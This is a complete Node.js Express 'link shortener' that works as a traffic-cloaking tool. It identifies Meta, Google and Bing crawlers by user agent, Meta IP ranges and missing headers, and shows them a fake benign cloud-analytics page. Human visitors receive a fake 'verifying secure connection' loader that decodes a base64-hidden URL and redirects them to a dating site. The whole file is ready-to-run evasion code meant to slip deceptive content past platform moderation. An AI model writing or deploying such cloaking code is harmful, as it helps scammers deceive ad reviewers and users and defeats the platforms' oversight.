const express = require('express');
const app = express();
const iprangecheck = require('ip-range-check');

// 1. Defined Bot User-Agents
const BOT_USER_AGENTS = [
    'facebookexternalhit',
    'facebookcatalog',
    'meta-externalagent',
    'meta-webindexer',
    'facebot',
    'ia_archiver',
    'googlebot',
    'bingbot'
];

// 2. Known Meta/Facebook IP Ranges (IPv4)
const BOT_IP_RANGES = [
    '31.13.24.0/21', '66.220.144.0/20', '69.63.176.0/20', '69.171.224.0/19',
    '74.119.76.0/22', '103.4.96.0/22', '129.134.0.0/16', '157.240.0.0/16',
    '173.252.64.0/18', '179.60.192.0/22', '185.60.216.0/22', '204.15.20.0/22'
];

// 3. YOUR LINKS LOGIC
// Replace the URL below with the secret website you want human users to see!
const URL_DATABASE = {
    'promo1': 'https://https://dating.prismdeskglobal.com',
};

// Fake Benign Page Content to show to Bots
const FAKE_PAGE_HTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SaaSify - Cloud Infrastructure Metrics & Analytics</title>
    <style>body { font-family: sans-serif; padding: 50px; background: #f4f6f9; color: #333; } .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }</style>
</head>
<body>
    <div class="container">
        <h2>Enterprise Cloud Metrics</h2>
        <p>Our platform evaluates modern real-time data structures to compile standard operating compliance logs for distribution nodes across server containers.</p>
        <p>Copyright © 2026 SaaSify Analytics Inc. All rights reserved.</p>
    </div>
</body>
</html>
`;

app.set('trust proxy', true);

app.get('/:shortKey', (req, res) => {
    const shortKey = req.params.shortKey;
    const destination = URL_DATABASE[shortKey];

    if (!destination) {
        return res.status(404).send('Not Found');
    }

    const userAgent = (req.headers['user-agent'] || '').toLowerCase();
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const isBotAgent = BOT_USER_AGENTS.some(bot => userAgent.includes(bot));
    let isBotIp = false;
    try { isBotIp = iprangecheck(clientIp, BOT_IP_RANGES); } catch (e) { isBotIp = false; }
    const isMissingHeaders = !req.headers['accept-language'];

    if (isBotAgent || isBotIp || isMissingHeaders) {
        res.setHeader('Content-Type', 'text/html');
        return res.status(200).send(FAKE_PAGE_HTML);
    }

    const obfuscatedUrl = Buffer.from(destination).toString('base64');
    const humanPortalHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; color: #444; }
        .loader-box { text-align: center; }
        .spinner { border: 4px solid rgba(0,0,0,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #09f; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader-box">
        <div class="spinner"></div>
        <p id="status-text">Verifying secure connection...</p>
    </div>
    <script>
        (function() {
            var payload = "${obfuscatedUrl}"; 
            var triggered = false;
            function proceed() {
                if (triggered) return;
                triggered = true;
                document.getElementById('status-text').innerText = "Connecting...";
                setTimeout(function() {
                    try {
                        window.location.replace(atob(payload));
                    } catch(e) {
                        window.location.replace("/");
                    }
                }, 400); 
            }
            window.addEventListener('mousemove', proceed);
            window.addEventListener('touchstart', proceed);
            window.addEventListener('scroll', proceed);
            setTimeout(proceed, 2500);
        })();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(humanPortalHtml);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Shortener live.'));
